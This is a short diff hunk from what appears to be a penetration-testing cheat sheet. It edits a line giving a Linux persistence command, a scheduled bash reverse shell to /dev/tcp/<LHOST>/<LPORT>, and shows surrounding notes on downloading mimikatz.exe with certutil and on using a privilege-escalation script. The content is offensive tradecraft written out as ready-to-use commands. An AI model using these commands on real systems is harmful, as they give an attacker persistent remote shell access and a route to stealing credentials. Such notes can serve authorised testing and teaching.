@@ -80,4 +80,4 @@ certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
 - use **who** to see which use has logged in remotely.
 - use **lastlog** see who has last logged in remotely.
 - use https://github.com/itm4n/PrivescCheck powershell script for privilege escalation in windows.
-- use the following for linux persistence: ***** /bin/bash -c 'bash -i &> /dev/tcp/<target ip>/<target port> 0>&1'
+- use the following for linux persistence: ***** /bin/bash -c 'bash -i &> /dev/tcp/<LHOST>/<LPORT> 0>&1'
